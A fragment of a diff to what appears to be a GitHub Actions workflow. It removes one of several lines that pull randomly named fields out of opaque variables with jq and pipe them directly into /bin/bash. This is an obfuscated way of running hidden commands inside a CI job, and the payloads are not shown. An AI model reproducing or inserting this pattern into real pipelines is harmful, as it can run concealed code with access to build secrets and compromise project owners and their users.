@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$h140" | jq -r .drzr16174 | /bin/bash
           printf '%s' "$hb2" | jq -r .ygb59090 | /bin/bash
           echo $ep13 | jq -r .pwfd5 | /bin/bash
-          echo $tr008 | jq -r .vgo63 | /bin/bash
           echo $xvql7936 | jq -r .vaxt85 | /bin/bash
 
       - name: Upload artifact
